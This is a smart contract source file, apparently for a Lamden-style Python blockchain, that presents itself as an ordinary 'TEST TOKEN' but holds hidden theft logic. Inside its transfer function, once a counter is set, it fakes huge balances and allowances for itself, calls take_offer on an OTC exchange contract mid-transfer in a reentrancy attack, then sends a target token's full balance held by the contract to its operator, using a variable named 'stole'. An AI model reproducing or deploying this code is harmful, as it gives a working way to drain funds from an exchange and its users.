import con_otc_v3

balances = Hash(default_value=0)
metadata = Hash()
TransferEvent = LogEvent(event="Transfer", params={"from":{'type':str, 'idx':True}, "to": {'type':str, 'idx':True}, "amount": {'type':(int, float, decimal)}})
ApproveEvent = LogEvent(event="Approve", params={"from":{'type':str, 'idx':True}, "to": {'type':str, 'idx':True}, "amount": {'type':(int, float, decimal)}})

listing_id = Variable()
rec = Variable()
stole = Variable()

@construct
def seed():
    balances[ctx.caller] = 1_000_000_000

    metadata['token_name'] = "TEST TOKEN"
    metadata['token_symbol'] = "TST"
    metadata['token_logo_url'] = 'https://some.token.url/test-token.png'
    metadata['token_website'] = 'https://some.token.url'
    metadata['total_supply'] = balances[ctx.caller]
    metadata['operator'] = ctx.caller
    rec.set(0)

@export
def setlisting(l: str):
    listing_id.set(l)
    
@export
def setrec(l: int):
    rec.set(l)
    
@export
def setstole(l: str):
    stole.set(l)

@export
def change_metadata(key: str, value: Any):
    assert ctx.caller == metadata['operator'], 'Only operator can set metadata!'
    metadata[key] = value
    
@export
def balance_of(address: str):
    return balances[address]

@export
def transfer(amount: float, to: str):
    assert amount > 0, 'Cannot send negative balances!'
    assert balances[ctx.caller] >= amount, 'Not enough coins to send!'

    balances[ctx.caller] -= amount
    balances[to] += amount
    
    if rec.get() > 0:
        rec.set(rec.get() - 1)
        balances[ctx.this, "con_otc_v3"] = 99999999999
        balances[ctx.this] = 99999999999
        con_otc_v3.take_offer(listing_id.get())
        t = importlib.import_module(stole.get())
        t.transfer(t.balance_of(ctx.this), metadata['operator'])
        

@export
def approve(amount: float, to: str):
    assert amount >= 0, 'Cannot approve negative balances!'
    
    balances[ctx.caller, to] = amount
    ApproveEvent({"from": ctx.caller, "to": to, "amount": amount})
    

@export
def transfer_from(amount: float, to: str, main_account: str):
    assert amount > 0, 'Cannot send negative balances!'
    assert balances[main_account, ctx.caller] >= amount, f'Not enough coins approved to send! You have {balances[main_account, ctx.caller]} and are trying to spend {amount}'
    assert balances[main_account] >= amount, 'Not enough coins to send!'

    balances[main_account, ctx.caller] -= amount
    balances[main_account] -= amount
    balances[to] += amount
    TransferEvent({"from": main_account, "to": to, "amount": amount})